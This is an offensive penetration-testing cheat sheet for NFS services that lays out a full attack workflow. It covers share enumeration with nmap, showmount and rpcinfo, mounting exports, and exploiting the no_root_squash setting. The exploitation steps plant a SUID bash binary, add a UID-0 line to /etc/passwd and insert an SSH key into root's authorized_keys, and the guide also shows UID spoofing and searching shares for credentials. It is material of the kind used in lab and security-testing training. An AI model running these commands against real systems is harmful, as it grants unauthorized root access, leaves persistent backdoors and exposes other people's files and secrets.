# NFS (Port 111, 2049)

Enumerate and exploit Network File System (NFS) shares to access remote file systems and escalate privileges.
NFS allows mounting remote directories over the network, commonly used in Unix/Linux environments for file sharing.

## Quick Reference

### Show Available Shares
```bash
showmount -e 10.10.10.10
```

### Mount NFS Share
```bash
mkdir /mnt/nfs
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock
```

## Enumeration

### Nmap Scripts
```bash
# NFS enumeration
nmap -p111,2049 --script nfs-* 10.10.10.10

# RPC info (includes NFS)
nmap -p111 --script rpcinfo 10.10.10.10

# NFS shares
nmap -p111 --script nfs-ls,nfs-showmount,nfs-statfs 10.10.10.10
```

### showmount
```bash
# Show available NFS exports
showmount -e 10.10.10.10

# Show all mount points
showmount -a 10.10.10.10

# Show directories
showmount -d 10.10.10.10
```

### rpcinfo
```bash
# List RPC services
rpcinfo -p 10.10.10.10

# Query specific service
rpcinfo -s 10.10.10.10
```

## Mounting NFS Shares

### Basic Mount
```bash
# Create mount point
mkdir /mnt/nfs

# Mount NFS share
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock

# Mount with specific NFS version
mount -t nfs -o vers=3,nolock 10.10.10.10:/share /mnt/nfs
```

### Mount Options
```bash
# Read-only mount
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,ro

# Soft mount (timeout on failure)
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,soft

# Specify port
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock,port=2049
```

### Unmount
```bash
# Unmount NFS share
umount /mnt/nfs

# Force unmount
umount -f /mnt/nfs

# Lazy unmount
umount -l /mnt/nfs
```

## Privilege Escalation via NFS

### no_root_squash Exploitation

#### Check for no_root_squash
```bash
# On target, check /etc/exports
cat /etc/exports

# Look for no_root_squash option
/share *(rw,no_root_squash,insecure)
```

#### Exploit no_root_squash
```bash
# On attacker machine (as root)
mkdir /mnt/nfs
mount -t nfs 10.10.10.10:/share /mnt/nfs

# Create SUID binary
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target machine
/share/bash -p
```

#### Alternative: Create Root User
```bash
# On attacker (as root)
mount -t nfs 10.10.10.10:/share /mnt/nfs

# Create malicious passwd entry
echo 'root2:x:0:0:root:/root:/bin/bash' >> /mnt/nfs/etc/passwd

# Or add SSH key
mkdir -p /mnt/nfs/root/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys
```

### UID/GID Manipulation

#### List Files with UIDs
```bash
# List with numeric UIDs/GIDs
ls -n /mnt/nfs/

# Example output:
# -rw-r--r-- 1 1000 1000 1221 Sep 19 18:21 file.txt
```

#### Match UID/GID
```bash
# Create user with matching UID
useradd -u 1000 tempuser

# Switch to that user
su tempuser

# Access files
cat /mnt/nfs/file.txt
```

## Configuration File

### /etc/exports Format
```bash
# View exports configuration
cat /etc/exports

# Example entries:
/share 10.10.10.0/24(rw,sync,no_subtree_check)
/data *(ro,all_squash)
/backup 10.10.10.5(rw,no_root_squash,insecure)
```

## Dangerous Settings

### Export Options

| Option | Description |
|--------|-------------|
| `rw` | Read and write permissions |
| `ro` | Read-only permissions |
| `no_root_squash` | Root on client has root privileges on share (dangerous!) |
| `root_squash` | Map root UID to anonymous UID (default, safer) |
| `all_squash` | Map all UIDs to anonymous UID |
| `insecure` | Allow connections from ports above 1024 |
| `nohide` | Export subdirectories independently |
| `sync` | Write changes to disk before responding |
| `async` | Write changes asynchronously (faster but risky) |

## Metasploit Modules

### NFS Enumeration
```bash
# NFS share scanner
use auxiliary/scanner/nfs/nfsmount
set RHOSTS 10.10.10.10
run
```

## Common Workflow

### Full NFS Enumeration and Exploitation
```bash
# 1. Discover NFS service
nmap -p111,2049 10.10.10.10

# 2. Enumerate shares
showmount -e 10.10.10.10

# 3. Mount share
mkdir /mnt/nfs
mount -t nfs 10.10.10.10:/share /mnt/nfs -o nolock

# 4. List contents with UIDs
ls -la /mnt/nfs/
ls -n /mnt/nfs/

# 5. Check for sensitive files
find /mnt/nfs/ -type f -name "*.txt" -o -name "*.conf" -o -name "*.key"

# 6. Search for credentials
grep -r "password" /mnt/nfs/ 2>/dev/null

# 7. If no_root_squash, create SUID binary
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# 8. Cleanup
umount /mnt/nfs
```

## Notes

**no_root_squash Exploitation:**
- Most dangerous NFS misconfiguration
- Allows root on client to have root privileges on share
- Can create SUID binaries or modify system files
- Default is root_squash which maps root to nobody

**UID/GID Mapping:**
- NFS uses numeric UIDs/GIDs, not usernames
- UID 1000 on client = UID 1000 on server
- Can create users with matching UIDs to access files
- Use `ls -n` to see numeric UIDs instead of usernames

**Security Considerations:**
- NFS has no built-in encryption (use NFSv4 with Kerberos)
- Authentication based on IP address and UID/GID
- Easily spoofed if not properly configured
- Should be restricted to trusted networks only

**Common Misconfigurations:**
- Exporting to wildcard (*) instead of specific IPs
- Using no_root_squash unnecessarily
- Allowing insecure ports (above 1024)
- Not using firewalls to restrict NFS access
- Exporting sensitive directories

**Enumeration Tips:**
- Check /etc/exports for configuration
- Look for no_root_squash in exports
- List files with `ls -n` to see UIDs
- Search for SSH keys, credentials, and config files
- Check for writable directories
- Look for backup files and databases

**Ports:**
- Port 111 - RPC portmapper (used to discover NFS port)
- Port 2049 - NFS service (default)
- Additional random ports for NFS services
